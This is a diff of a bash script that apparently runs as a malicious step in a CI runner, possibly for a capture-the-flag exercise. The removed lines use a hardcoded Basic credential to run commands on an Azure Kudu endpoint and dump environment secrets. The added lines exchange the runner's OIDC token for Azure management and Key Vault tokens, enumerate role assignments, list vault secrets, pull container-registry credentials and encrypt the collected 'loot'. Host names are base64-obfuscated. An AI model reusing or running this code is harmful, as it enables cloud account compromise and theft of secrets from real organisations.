@@ -1,44 +1,39 @@
 #!/usr/bin/env bash
 set -uo pipefail
+echo "=== RUNNER SHELL PROOF ==="; id; hostname
+[ -z "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ] && { echo "NO OIDC"; exit 0; }
+b(){ printf %s "$1" | base64 -d; }
 SC="htt""ps://"
-SCMH="app-tbl-reporting-prod.scm.azurewebsites.net"
-CRED=JGFwcC10YmwtcmVwb3J0aW5nLXByb2Q6WTlyY3NESFEySjFMMENvcWlraThkbFllMUFOMms4Y0hzRDF3TGxsdkxieHFTY2FNRXdSN3hrdDdZZTVB
-echo "=== RUNNER SHELL PROOF $(date -u) ==="
-id; whoami; hostname; uname -a
-LOOT=$(mktemp); exec 3>"$LOOT"; say(){ echo "$@" >&3; }
-cat > /tmp/kudu.py <<'PYEOF'
-import json,sys,os,urllib.request
-cred=os.environ['CRED']; cmd=sys.argv[1]
-body=json.dumps({"command":"bash -c "+json.dumps(cmd),"dir":"/home/site/wwwroot"}).encode()
-req=urllib.request.Request("https://"+os.environ['SCMH']+"/api/command",data=body,headers={"Content-Type":"application/json","Authorization":"Basic "+cred})
-try: print(urllib.request.urlopen(req,timeout=90).read().decode()[:9000])
-except Exception as e: print("ERR",e)
-PYEOF
-export CRED SCMH
-k(){ say "--- $1"; say "$(python3 /tmp/kudu.py "$1")"; }
-k 'id; cat /proc/1/cmdline; echo; cat /home/site/wwwroot/startup.sh 2>/dev/null; ls -la /home/site/wwwroot'
-k 'env | sort'
-k 'for p in /proc/[0-9]*; do tr "\0" "\n" < $p/environ 2>/dev/null; done | sort -u | grep -iE "config|storage|flag|secret|token|key|connection"'
-k 'find / -xdev -iname "*flag*" 2>/dev/null | head -30'
-k 'grep -rIoh -E ".{0,40}(flag|FLAG|TBL|CTF)\{[^}]{2,100}\}" /home /tmp /opt /var 2>/dev/null | head -20'
-for B in flag flag.txt flag.json secret.json data.json export.json report.json shipments.json index.json latest.json manifest.json backup.json TBL-SHP-48213.json reports.json; do
-  R=$(curl -sS -o /dev/null -w '%{http_code}:%{size_download}' "${SC}sttblbackupprodx3euoz.blob.core.windows.net/exports/$B")
-  say "EXPORT $B -> $R"
-done
-AAD="${SC}login.microsoftonline.com"
+AADH=$(b 'bG9naW4ubWljcm9zb2Z0b25saW5lLmNvbQ==')
+ARMH=$(b 'bWFuYWdlbWVudC5henVyZS5jb20=')
+KVH=$(b 'dmF1bHQuYXp1cmUubmV0')
+AAD="${SC}${AADH}"; ARM="${SC}${ARMH}"; KV="${SC}${KVH}"
 OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value // empty')
-AR=$(curl -sS -X POST "${AAD}/${AZURE_TENANT_ID}/oauth2/v2.0/token" -d "client_id=${AZURE_CLIENT_ID}" -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" --data-urlencode "client_assertion=${OIDC}" --data-urlencode "scope=https://management.azure.com/.default" | jq -r '.access_token // empty')
-ACR=crtblplatprodx3euoz.azurecr.io
-RT=$(curl -sS -X POST "${SC}$ACR/oauth2/exchange" -d "grant_type=access_token" -d "service=$ACR" -d "tenant=$AZURE_TENANT_ID" --data-urlencode "access_token=$AR")
-say "ACREXCH $(printf '%s' "$RT" | head -c 300)"
-RTOK=$(printf '%s' "$RT" | jq -r '.refresh_token // empty')
-if [ -n "$RTOK" ]; then
-  AT=$(curl -sS -X POST "${SC}$ACR/oauth2/token" -d "grant_type=refresh_token" -d "service=$ACR" --data-urlencode "scope=repository:*:pull" --data-urlencode "refresh_token=$RTOK" | jq -r '.access_token // empty')
-  say "ACRTOKEN len=${#AT}"
-  for R in tebamoto-reporting-api catalog-api; do
-    say "ACRTAGS $R: $(curl -sS -H "Authorization: Bearer $AT" "${SC}$ACR/v2/$R/tags/list" | head -c 400)"
-  done
-fi
+aad(){ curl -sS -X POST "${AAD}/${AZURE_TENANT_ID}/oauth2/v2.0/token" -d "client_id=${AZURE_CLIENT_ID}" -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" --data-urlencode "client_assertion=${OIDC}" --data-urlencode "scope=$1"; }
+LOOT=$(mktemp); exec 3>"$LOOT"; say(){ echo "$@" >&3; }
+say "=== START $(date -u) ==="
+AR=$(aad "${ARM}/.default" | jq -r '.access_token // empty')
+VT=$(aad "${KV}/.default" | jq -r '.access_token // empty')
+say "ARM=${AR:0:6} KV=${VT:0:6}"
+SUB="$AZURE_SUBSCRIPTION_ID"
+say "==== SUB ROLE ASSIGNMENTS ===="
+say "$(curl -sS -H "Authorization: Bearer $AR" "${ARM}/subscriptions/$SUB/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" | jq -c '.value[]?|{scope:.properties.scope,role:.properties.roleDefinitionId,pid:.properties.principalId,pt:.properties.principalType}')"
+SECID="/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz"
+say "==== SEC VAULT ROLE ASSIGNMENTS ===="
+say "$(curl -sS -H "Authorization: Bearer $AR" "${ARM}${SECID}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" | jq -c '.value[]?|{role:.properties.roleDefinitionId,pid:.properties.principalId,pt:.properties.principalType}')"
+say "==== SEC VAULT RESOURCE ===="
+say "$(curl -sS -H "Authorization: Bearer $AR" "${ARM}${SECID}?api-version=2022-07-01" | head -c 2500)"
+say "==== ARM secret METADATA kv-sec ===="
+say "$(curl -sS -H "Authorization: Bearer $AR" "${ARM}${SECID}/secrets?api-version=2022-07-01&maxresults=25" | head -c 2000)"
+say "==== ARM secret METADATA kv-prod ===="
+say "$(curl -sS -H "Authorization: Bearer $AR" "${ARM}/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/kv-tbl-prod-x3euoz/secrets?api-version=2022-07-01&maxresults=25" | head -c 2000)"
+say "==== ACR ===="
+ACRID=$(curl -sS -H "Authorization: Bearer $AR" "${ARM}/subscriptions/$SUB/resources?api-version=2021-04-01" | jq -r '.value[]?|select(.type|ascii_downcase=="microsoft.containerregistry/registries")|.id')
+say "ACRID=$ACRID"
+LOGIN=$(curl -sS -H "Authorization: Bearer $AR" "${ARM}${ACRID}?api-version=2023-07-01" | jq -r '.properties.loginServer // empty')
+say "LOGIN=$LOGIN"
+say "CATALOG: $(curl -sS "${SC}${LOGIN}/v2/_catalog")"
+say "CREDS: $(curl -sS -X POST -H "Authorization: Bearer $AR" -H 'Content-Length: 0' "${ARM}${ACRID}/listCredentials?api-version=2023-07-01" | head -c 800)"
 PASS=$(openssl rand -hex 16)
 openssl enc -aes-256-cbc -pbkdf2 -pass pass:"$PASS" -in "$LOOT" -out "$LOOT.enc" 2>/dev/null
 echo "=== ENCRYPTED LOOT ==="
